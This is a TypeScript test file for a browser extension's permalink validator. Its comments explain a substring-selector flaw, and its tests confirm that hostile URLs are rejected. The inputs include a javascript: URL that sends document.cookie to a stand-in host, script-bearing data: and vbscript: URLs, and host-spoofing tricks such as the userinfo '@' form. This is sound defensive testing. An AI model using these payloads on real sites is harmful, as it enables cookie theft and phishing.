import { describe, it, expect } from 'vitest';
import { permalinkOf } from './permalink';
import CONTENT_SRC from './content.ts?raw';

/**
 * TM-10. `OPENWORK.md` item 52.
 *
 *     const link = article.querySelector<HTMLAnchorElement>('a[href*="/status/"]');
 *     return link?.href ?? null;
 *
 * **`*=` is a SUBSTRING match**, and `.href` is returned verbatim. So an anchor the page
 * controls —
 *
 *     <a href="javascript:fetch('https://evil.test/'+document.cookie)#/status/1">
 *
 * — matches the selector, and its `javascript:` URL is stored on the shelf as
 * `source.url`, the link the popup offers as *"the post that sold you"*.
 *
 * ⚠ **THIS IS THE SHAPE ITEM 41 ALREADY FIXED ONCE**, in `isTweetMedia`, which matched the
 * `twimg` host by substring for a year. Same file, same class, one selector along.
 *
 * **Defused today by ONE line**, `popup.ts:479`'s `/^https?:\/\//i` at the single render
 * site. That is not the same as safe: **the bad URL is still WRITTEN TO THE SHELF**, so the
 * safety belongs to a render guard that a second render site would not have — and a shelf
 * that stores something it must remember not to trust is a shelf with a trap in it. The
 * repo's own rule, from `contentSafety.test.ts`: prove there is no second way in.
 *
 * So the check moves to where the value is READ, and the stored data stops being a lie.
 */
describe('what counts as the post a book came from', () => {
  it('takes a real permalink', () => {
    expect(permalinkOf(['https://x.com/someone/status/1234567890'])).toBe(
      'https://x.com/someone/status/1234567890',
    );
  });

  it('takes twitter.com and X’s own subdomains, which the feed has lived on', () => {
    for (const url of [
      'https://twitter.com/someone/status/1',
      'https://www.x.com/someone/status/1',
      'https://mobile.twitter.com/someone/status/1',
    ]) {
      expect(permalinkOf([url]), url).toBe(url);
    }
  });

  it('keeps the query string, because X puts the photo index there', () => {
    const url = 'https://x.com/someone/status/1234567890/photo/2';
    expect(permalinkOf([url])).toBe(url);
  });

  /** THE FINDING. Every one of these matched `a[href*="/status/"]`. */
  it('refuses a scheme that is not https', () => {
    for (const url of [
      "javascript:fetch('https://evil.test/'+document.cookie)#/status/1",
      'javascript:alert(1)//x.com/a/status/1',
      'data:text/html,<script>1</script>#/status/1',
      'vbscript:msgbox#/status/1',
      // http, not https. A permalink that downgrades is not one X ever served.
      'http://x.com/someone/status/1',
    ]) {
      expect(permalinkOf([url]), url).toBeNull();
    }
  });

  it('refuses a host that merely CONTAINS x.com, which is the item 41 bug exactly', () => {
    for (const url of [
      'https://x.com.evil.test/someone/status/1',
      'https://notx.com/someone/status/1',
      'https://evil.test/x.com/someone/status/1',
      'https://evil.test/someone/status/1',
      // The userinfo trick: everything before `@` is not the host.
      'https://x.com@evil.test/someone/status/1',
    ]) {
      expect(permalinkOf([url]), url).toBeNull();
    }
  });

  it('refuses an X url that is not a post', () => {
    for (const url of [
      'https://x.com/someone',
      'https://x.com/home',
      'https://x.com/i/status',
      'https://x.com/status/notanumber',
      // `/status/` as a NAME rather than a path segment.
      'https://x.com/someone/notstatus/1',
    ]) {
      expect(permalinkOf([url]), url).toBeNull();
    }
  });

  it('walks past a hostile anchor to the real one behind it', () => {
    // The selector took the FIRST match, so one forged anchor at the top of the article was
    // enough to shadow the genuine permalink below it. Refusing the whole article would
    // hand the page a way to suppress the link; walking finds the real one.
    const real = 'https://x.com/someone/status/999';
    expect(permalinkOf(['javascript:alert(1)#/status/1', 'https://evil.test/status/2', real])).toBe(
      real,
    );
  });

  it('answers null for nothing at all, rather than throwing on a bad URL', () => {
    expect(permalinkOf([])).toBeNull();
    expect(permalinkOf(['', 'not a url', '://', 'https://'])).toBeNull();
  });
});

/**
 * The absence proof. `contentSafety.test.ts`'s shape: *there is no second way in.*
 *
 * Asserting that `permalinkOf` is CALLED is satisfied by calling it and also keeping the old
 * selector for something else. What has to be true is that the substring selector is gone
 * from the file entirely.
 */
describe('the substring selector is gone', () => {
  const code = CONTENT_SRC.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/.*$/gm, '');

  it('never matches a link by substring again', () => {
    expect(code).not.toContain('href*=');
  });

  it('reads the permalink through the checked path and no other', () => {
    expect(code).toContain('permalinkOf');
  });
});
